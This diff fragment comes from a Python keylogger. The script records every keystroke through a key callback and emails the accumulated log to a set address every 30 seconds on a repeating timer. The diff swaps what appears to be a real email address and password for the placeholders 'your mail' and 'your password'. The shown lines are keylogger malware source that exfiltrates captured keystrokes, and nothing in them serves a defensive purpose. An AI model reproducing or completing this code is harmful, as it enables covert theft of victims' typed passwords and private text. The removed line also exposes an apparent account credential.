@@ -8,7 +8,7 @@ def callback_function(key):
     global log
     try:
         log = log + key.char.encode("utf-8")
-        #log = log + str(key.char)
+       
     except AttributeError:
         if key == key.space:
             log = log + " "
@@ -26,7 +26,7 @@ def send_email(email,password,message):
 
 def thread_func():
     global log
-    send_email("l.ghemish@gmail.com", "Ex-Officer.8267", log)
+    send_email("your mail", "your password", log)
     log = ""
     timer_object = threading.Timer(30,thread_func)
     timer_object.start()
